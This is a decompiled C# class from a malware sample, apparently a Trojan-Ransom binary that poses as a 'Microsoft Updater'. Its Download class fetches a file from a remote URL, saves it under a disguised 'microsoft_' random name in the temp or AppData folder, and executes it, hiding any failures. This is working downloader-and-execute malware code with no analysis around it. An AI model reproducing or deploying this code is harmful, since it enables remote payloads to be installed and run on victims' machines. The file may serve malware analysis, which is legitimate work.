// Decompiled with JetBrains decompiler
// Type: Epidemic_HTTP.Download
// Assembly: Microsoft Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E2B3032-0636-4B8C-A49B-30EA659CCFCC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00024-msil\Trojan-Ransom.Win32.Foreign.neod-4b5461e9b7975d274b77e2b28ee9fc7a71cf3294652993dfd23081524d2a783e.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace Epidemic_HTTP
{
  internal class Download
  {
    private string fileURL;
    private string fileName;
    private bool update;

    public Download(string f_fileURL, string f_fileName, bool f_update)
    {
      this.fileURL = f_fileURL;
      this.fileName = f_fileName;
      this.update = f_update;
    }

    public void DownloadFile()
    {
      try
      {
        if (this.fileName.StartsWith("*"))
        {
          string str = this.fileName.Split('*')[1];
          this.fileName = "microsoft_" + Functions.RandomString(10, true) + str;
        }
        if (System.IO.File.Exists(Path.GetTempPath() + this.fileName))
          System.IO.File.Delete(Path.GetTempPath() + this.fileName);
        try
        {
          new WebClient().DownloadFile(this.fileURL, Path.GetTempPath() + this.fileName);
          Process.Start(Path.GetTempPath() + this.fileName);
        }
        catch
        {
        }
        if (!System.IO.File.Exists(Path.GetTempPath() + this.fileName))
        {
          try
          {
            new WebClient().DownloadFile(this.fileURL, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + this.fileName);
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + this.fileName);
          }
          catch
          {
          }
        }
        bool flag = false;
        if (System.IO.File.Exists(Path.GetTempPath() + this.fileName) || System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + this.fileName))
          flag = true;
        if (!this.update || !flag)
          return;
        Environment.Exit(0);
      }
      catch (Exception ex)
      {
        Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
      }
    }
  }
}
